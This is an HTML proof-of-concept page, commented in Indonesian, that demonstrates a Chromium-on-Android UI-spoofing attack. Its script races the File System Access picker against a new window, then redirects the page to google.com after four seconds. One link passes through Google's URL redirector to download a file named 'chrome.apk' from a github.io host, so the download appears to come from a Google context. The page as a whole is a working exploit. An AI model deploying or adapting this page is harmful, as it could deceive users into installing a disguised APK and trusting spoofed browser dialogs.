<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Enhanced UI Spoofing & 4s Redirect</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
        h1 {
            color: #333;
        }
        .container {
            margin-top: 30px;
        }
        button, a.button-link {
            display: inline-block;
            margin: 15px;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            background-color: #d93025; /* Warna aksen Google/Chrome */
            color: white;
            border: none;
            border-radius: 6px;
            text-decoration: none;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: background 0.2s;
        }
        button:hover, a.button-link:hover {
            background-color: #b5221b;
        }
        .secondary {
            background-color: #1a73e8;
        }
        .secondary:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>

    <h1>Chromium Android UI Spoofing PoC</h1>
    <p>Pilih salah satu simulasi di bawah untuk menguji perilaku multi-window & dialog:</p>

    <div class="container">
        <!-- Tombol Asli: File Picker -->
        <div>
            <button id="openPickerBtn" class="secondary">Open New Window & Upload Photo</button>
        </div>

        <!-- Tombol Diperkuat: Download APK dengan URL Lengkap & Trigger Gabungan -->
        <div>
            <a href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" 
               class="button-link" 
               id="downloadApkBtn" 
               target="_blank" 
               rel="noopener noreferrer">
                Open New Window & Download APK (Google.com Context)
            </a>
        </div>
    </div>

    <script>
        // Fungsi pembantu untuk memicu redirect halaman setelah durasi tertentu (4 detik)
        function triggerDelayedRedirect() {
            setTimeout(function() {
                window.location.href = "https://www.google.com";
            }, 4000); // 4000 milidetik = 4 detik
        }

        // Logika asli Anda untuk File Picker
        document.getElementById('openPickerBtn').addEventListener('click', async () => {
            try {
                if (window.showOpenFilePicker) {
                    const handles = await window.showOpenFilePicker();
                    console.log(handles);
                } else {
                    alert('File System Access API tidak didukung di browser ini.');
                }
            } catch (err) {
                console.error('File picker ditolak atau dibatalkan:', err);
            }
            
            // Memicu hitungan mundur redirect 4 detik setelah tombol diklik
            triggerDelayedRedirect();
        });

        // Logika penguatan untuk tombol Download APK & pemicu jendela bersamaan
        document.getElementById('downloadApkBtn').addEventListener('click', function(e) {
            // Memastikan pemicu interaksi sistem berjalan paralel dengan navigasi target
            try {
                if (window.showOpenFilePicker) {
                    // Memicu picker secara non-blocking agar dialog sistem bersaing saat window baru terbuka
                    window.showOpenFilePicker().catch(() => {});
                }
            } catch (err) {
                console.error('Trigger error:', err);
            }

            // Memicu hitungan mundur redirect 4 detik setelah tautan diklik/long-press dibuka
            triggerDelayedRedirect();
        });
    </script>

</body>
</html>
